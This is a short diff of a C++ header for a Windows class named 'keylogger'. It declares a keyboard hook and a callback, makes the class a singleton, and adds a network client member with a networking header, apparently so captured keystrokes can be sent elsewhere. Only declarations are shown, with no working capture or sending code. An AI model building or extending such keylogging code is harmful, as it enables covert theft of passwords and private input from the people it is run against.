@@ -8,20 +8,23 @@
 #include <iostream>
 #include <Windows.h>
 #include <fstream>
+#include "kqnet.h"
+#include "common.h"
 
 class keylogger
 {
 public:
-    keylogger();
     
-    ~keylogger();
+    static keylogger& GetInstance();
 
 
 private:
+    keylogger();
+
+    ~keylogger();
     static HHOOK hook;
 
     static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-    static keylogger& GetInstance();
     
-
+    kq::client_interface<messageType> client;
 };
